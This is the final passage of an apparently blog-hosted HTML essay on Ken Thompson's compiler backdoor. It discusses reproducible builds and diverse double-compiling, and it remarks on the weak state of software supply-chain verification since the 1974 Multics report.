</p>

<p><a href="#repro"><b id="repro">Reproducible Builds</b></a>.
Diverse double-compiling and any other verifying of binaries
by rebuilding source code depends on builds being reproducible.
That is, the same inputs should produce the same outputs.
Computers being deterministic, you’d think this would be trivial,
but in modern systems it is not.
We saw a tiny example above,
where compiling the code as <code>ccevil.c</code>
produced a different binary than compiling
the code as <code>cc.c</code>
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The <a href="https://reproducible-builds.org/">Reproducible Builds</a>
project collects resources to help people achieve this goal.
</p>

<p><a href="#modern"><b id="modern">Modern Security</b></a>.
In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974.
It suggested requiring source code as a way to allow inspection of the system on delivery,
and it raised this kind of backdoor as a potential barrier to that inspection.
Half a century later, we all run binaries with no available source code at all.
Even when source is available, as in open source operating systems like Linux,
approximately no one checks that the distributed binaries match the source code.
The programming environments for languages like Go, NPM, and Rust make it
trivial to download and run source code published by <a href="https://cceckman.com/reading/roundups/2025-11-13/deps">strangers on the internet</a>,
and again almost no one is checking the code, until there is a problem.
No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.

</p><p>
On the other hand, given all our reckless behavior,
there are far fewer problems than you would expect.
Quite the opposite:
we trust computers with nearly every aspect of our lives,
and for the most part nothing bad happens.
Something about our security posture must be better than it seems.
Even so, it might be nicer to live in a world where
the only possible attacks required the sophistication of approaches like Ken’s
(like in this <a href="https://www.teamten.com/lawrence/writings/coding-machines/">excellent science fiction story</a>).
</p>

<p>
We still have work to do.
</p>

      </div>
    </div></div>
  </body>
</html>
